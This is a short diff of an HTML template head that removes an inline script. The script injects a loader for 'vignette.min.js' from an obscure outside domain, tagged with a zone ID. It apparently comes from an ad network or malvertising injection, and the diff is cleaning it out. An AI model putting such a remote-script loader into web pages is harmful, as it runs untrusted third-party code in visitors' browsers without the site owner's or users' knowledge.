@@ -2,7 +2,7 @@
 <html lang="en">
 
 <head>
-    <script>(function(s){s.dataset.zone='11685935',s.src='https://n6wxm.com/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+    
     <link rel="icon" href="{{ asset('img/favicon.ico') }}" type="image/x-icon">
 
     <meta charset="utf-8">
